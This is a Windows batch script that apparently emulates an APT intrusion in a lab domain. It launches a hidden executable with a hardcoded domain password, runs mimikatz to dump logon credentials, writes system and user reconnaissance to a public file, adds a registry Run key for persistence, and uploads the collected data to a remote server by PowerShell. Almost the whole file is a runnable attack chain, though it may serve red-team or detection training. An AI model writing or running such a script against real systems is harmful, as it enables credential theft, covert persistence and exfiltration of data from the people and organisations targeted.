@echo off



echo Initial shell...

REM Set the domain, username, and password for testing
set "domain=dcloud.local"
set "username=john"
set "password=C1sco12345"


REM Define the destination directory where the contents will be extracted
set "extractedDir=C:\Temp"



REM Define the path to the extracted executable (Ensure paths are within double quotes)
set "executablePath=%extractedDir%\challenge.exe"

REM Run the executable using PowerShell with the provided domain user credentials
powershell -Command "$SecurePassword = ConvertTo-SecureString '%password%' -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ('%domain%\%username%', $SecurePassword); Start-Process -FilePath '%executablePath%' -Credential $Credential -WindowStyle Hidden"

echo.
echo.

echo Privilege Escalation...


C:\APT1\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" >> "C:\Users\Public\info.txt" exit 


echo.
echo.

echo Internal Reconnaissance...
ipconfig /all >> "C:\Users\Public\info.txt"
net start >> "C:\Users\Public\info.txt"
tasklist /v >> "C:\Users\Public\info.txt"
net user >> "C:\Users\Public\info.txt"
net localgroup administrators >> "C:\Users\Public\info.txt"
netstat -ano >> "C:\Users\Public\info.txt"



echo.
echo.

echo Presence...

copy C:\Temp\challenge.exe C:\Users\Public
set KeyName=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
set EntryName=Challenge
set EntryValue="C:\Users\Public\challenge.exe"
REM Check if the registry entry exists
reg query "%KeyName%" /v "%EntryName%" >nul 2>&1
if %errorlevel% equ 0 (
    REM If the entry exists, overwrite it
    reg add "%KeyName%" /v "%EntryName%" /t REG_SZ /d %EntryValue% /f
    echo Entry "%EntryName%" overwritten.
) else (
    REM If the entry does not exist, create it
    reg add "%KeyName%" /v "%EntryName%" /t REG_SZ /d %EntryValue%
    echo Entry "%EntryName%" created.
)

echo.
echo.

echo Exfiltration...

powershell -Command (New-Object System.Net.WebClient).UploadFile('http://198.19.30.48:8090/upload.php', 'C:\Users\Public\info.txt')

pause